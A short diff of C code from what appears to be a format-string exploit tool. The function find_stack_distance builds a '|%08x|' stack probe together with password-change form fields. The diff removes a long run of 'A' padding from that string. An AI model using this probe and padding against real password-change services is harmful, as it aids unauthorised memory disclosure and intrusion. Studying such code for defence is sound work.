@@ -146,7 +146,7 @@ find_stack_distance (char *buffer, int maxlen, int align, int stack_height)
 
 	strncat (buffer, "|%08x|", maxlen);
 	
-	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha&AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", maxlen);
+	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha", maxlen);
 }
 
 int
